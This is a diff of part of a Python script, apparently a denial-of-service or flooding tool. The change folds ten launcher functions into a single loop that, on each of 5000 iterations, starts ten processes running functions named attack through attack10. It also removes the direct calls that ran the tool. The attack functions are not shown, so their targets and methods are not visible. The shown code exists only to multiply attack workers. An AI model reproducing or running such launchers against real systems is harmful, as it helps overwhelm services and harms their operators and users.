@@ -211,72 +211,34 @@ def attack10():
 
 def sendattack():
   for i in range(5000):
-    mp = multiprocessing.Process(target=attack)   
+    mp = multiprocessing.Process(target=attack) 
+    mp2 = multiprocessing.Process(target=attack2)
+    mp3 = multiprocessing.Process(target=attack3)
+    mp4 = multiprocessing.Process(target=attack4)
+    mp5 = multiprocessing.Process(target=attack5)
+    mp6 = multiprocessing.Process(target=attack6)
+    mp7 = multiprocessing.Process(target=attack7)
+    mp8 = multiprocessing.Process(target=attack8)
+    mp9 = multiprocessing.Process(target=attack9)
+    mp10 = multiprocessing.Process(target=attack10)
     mp.setDaemon = False
+    mp2.setDaemon = False
+    mp3.setDaemon = False
+    mp4.setDaemon = False
+    mp5.setDaemon = False
+    mp6.setDaemon = False
+    mp7.setDaemon = False
+    mp8.setDaemon = False
+    mp9.setDaemon = False
+    mp10.setDaemon = False
     mp.start()
-     
-def send2attack():
-  for i in range(5000):
-    mp = multiprocessing.Process(target=attack2)   
-    mp.setDaemon = False
-    mp.start()
+    mp2.start()
+    mp3.start()
+    mp4.start()
+    mp5.start()
+    mp6.start()
+    mp7.start()
+    mp8.start()
+    mp9.start()
+    mp10.start()
     
-def send3attack():
-  for i in range(5000):
-    mp = multiprocessing.Process(target=attack3)   
-    mp.setDaemon = False
-    mp.start()
-    
-def send4attack():
-  for i in range(5000):
-    mp = multiprocessing.Process(target=attack4)   
-    mp.setDaemon = False
-    mp.start()
-    
-def send5attack():
-  for i in range(5000):
-    mp = multiprocessing.Process(target=attack5)   
-    mp.setDaemon = False
-    mp.start()
-    
-def send6attack():
-  for i in range(5000):
-    mp = multiprocessing.Process(target=attack6)   
-    mp.setDaemon = False
-    mp.start()
-    
-def send7attack():
-  for i in range(5000):
-    mp = multiprocessing.Process(target=attack7)   
-    mp.setDaemon = False
-    mp.start()
-    
-def send8attack():
-  for i in range(5000):
-    mp = multiprocessing.Process(target=attack8)   
-    mp.setDaemon = False
-    mp.start()
-    
-def send9attack():
-  for i in range(5000):
-    mp = multiprocessing.Process(target=attack9)   
-    mp.setDaemon = False
-    mp.start()
-    
-def send10attack():
-  for i in range(5000):
-    mp = multiprocessing.Process(target=attack10)   
-    mp.setDaemon = False
-    mp.start()
-
-sendattack()
-send2attack()
-send3attack()
-send4attack()
-send5attack()
-send6attack()
-send7attack()
-send8attack()
-send9attack()
-send10attack()
-
